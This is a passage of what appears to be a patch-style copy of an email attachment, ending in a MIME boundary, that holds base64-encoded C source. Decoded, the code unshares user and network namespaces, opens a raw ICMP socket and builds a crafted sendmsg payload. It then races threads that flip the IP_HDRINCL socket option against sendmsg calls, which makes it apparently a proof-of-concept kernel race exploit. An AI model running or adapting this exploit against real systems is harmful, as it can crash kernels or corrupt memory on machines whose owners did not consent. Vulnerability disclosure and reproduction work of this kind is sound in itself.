+bnNoYXJlKENMT05FX05FV1VTRVIpIik7CgkJZXhpdCgxKTsKCX0KCWlmKHVu
+c2hhcmUoQ0xPTkVfTkVXTkVUKSAhPSAwKSB7CgkJcGVycm9yKCJ1bnNoYXJl
+ZChDTE9ORV9ORVdVU0VSKSIpOwoJCWV4aXQoMik7Cgl9Cn0KCnZvaWQgKmRv
+X3NldHNvY2tvcHRfaGRyaW5jbCh2b2lkICphcmcpCnsKCWludCBlcnIsdmFs
+OwoJdmFsID0gKihpbnQqKWFyZzsKICAgCgllcnIgPSBzZXRzb2Nrb3B0KGZk
+c29jayxTT0xfSVAsSVBfSERSSU5DTCwmdmFsLDQpOyAKCUNIS0VSUihlcnIs
+InNldHNvY2tvcHRfaW50Iik7CglyZXR1cm4gTlVMTDsKfQoKdm9pZCBkb19w
+b2xsKHZvaWQpCnsKCXBvbGwoKHN0cnVjdCBwb2xsZmQqKXBheWxvYWQsMjU2
+LDApOwp9CgoKaW50IGNyZWF0ZV9zb2NrZXQodm9pZCkKewoJaW50IGZkID0g
+c29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0lDTVApOwoJQ0hL
+RVJSKGZkIDwgMCwic29ja2V0Iik7CglyZXR1cm4gZmQ7Cn0KCnN0cnVjdCBt
+c2doZHIgKnByZXBhcmVfc2VuZG1zZyh2b2lkKQp7CglzdHJ1Y3QgbXNnaGRy
+ICptc2c7CgoJaW50IG9mZiA9IDE1NjsKCQoJbWVtc2V0KGJ1ZiwweGNjLFBT
+SVpFKTsKCW1lbXNldChwYXlsb2FkLDB4MDAsMjA0OCk7CgltZW1zZXQocGF5
+bG9hZCtvZmYgLCAweDExLDgpOwoKCWZvcihpPTA7aTwyNTY7aSsrKSB7CgkJ
+aW92W2ldLmlvdl9iYXNlID0gYnVmOwoJCWlvdltpXS5pb3ZfbGVuID0gUFNJ
+WkU7Cgl9CgoJbXNnID0gbWFsbG9jKHNpemVvZihzdHJ1Y3QgbXNnaGRyKSk7
+CglpZighbXNnKSB7CgkJcGVycm9yKCJtYWxsb2MiKTsKCQlleGl0KC0xKTsK
+CX0KCW1lbXNldChtc2csMCxzaXplb2Yoc3RydWN0IG1zZ2hkcikpOwoJbWVt
+c2V0KCZzaW4sMCxzaXplb2Yoc2luKSk7CgkKCW1zZy0+bXNnX25hbWUgPSAm
+c2luOwoJbXNnLT5tc2dfbmFtZWxlbiA9IHNpemVvZihzaW4pOwoJbXNnLT5t
+c2dfaW92ID0gaW92OwoJbXNnLT5tc2dfaW92bGVuID0gMjU2OwoJbXNnLT5t
+c2dfY29udHJvbCA9IE5VTEw7Cgltc2ctPm1zZ19jb250cm9sbGVuID0gMDsK
+CW1zZy0+bXNnX2ZsYWdzID0gMDsKCXJldHVybiBtc2c7Cn0Kdm9pZCAqZG9f
+c2VuZG1zZ19mb3JfcmFjZSh2b2lkICphcmcpCnsKCWludCB2YWwgPSAxOwoJ
+aW50IGZkID0gKihpbnQqKWFyZzsKCglzZXRzb2Nrb3B0KGZkLFNPTF9JUCxJ
+UF9IRFJJTkNMLCZ2YWwsNCk7Cglkb19wb2xsKCk7CglzZW5kbXNnKGZkLG1z
+ZywwKTsKCQoJcmV0dXJuIE5VTEw7Cn0KCgoKdm9pZCByYWN5KHZvaWQpCnsK
+CWludCBpOwoJCglmb3IoaT0wO2k8VElEU0laRTtpKyspIHsKCQlwdGhyZWFk
+X2NyZWF0ZSgmdGlkMVtpXSxOVUxMLGRvX3NldHNvY2tvcHRfaGRyaW5jbCwo
+dm9pZCopJnZhbDApOwoJCXB0aHJlYWRfY3JlYXRlKCZ0aWQyW2ldLE5VTEws
+ZG9fc2VuZG1zZ19mb3JfcmFjZSwodm9pZCopJmZkc29jayk7CgkKCX0KCWZv
+cihpPTA7aTxUSURTSVpFO2krKykgewoJCXB0aHJlYWRfam9pbih0aWQxW2ld
+LE5VTEwpOwoJCXB0aHJlYWRfam9pbih0aWQyW2ldLE5VTEwpOwoJfQoKfQpp
+bnQgbWFpbihpbnQgYXJnYyxjaGFyICoqYXJndikKewoJY3JlYXRlX25zKCk7
+CglmZHNvY2sgPSBjcmVhdGVfc29ja2V0KCk7Cgltc2cgPSBwcmVwYXJlX3Nl
+bmRtc2coKTsKCQoJcmFjeSgpOwoJCglyZXR1cm4gMDsKCQp9Cg==
+
+--001a11482b1cb7a18005606a34df--
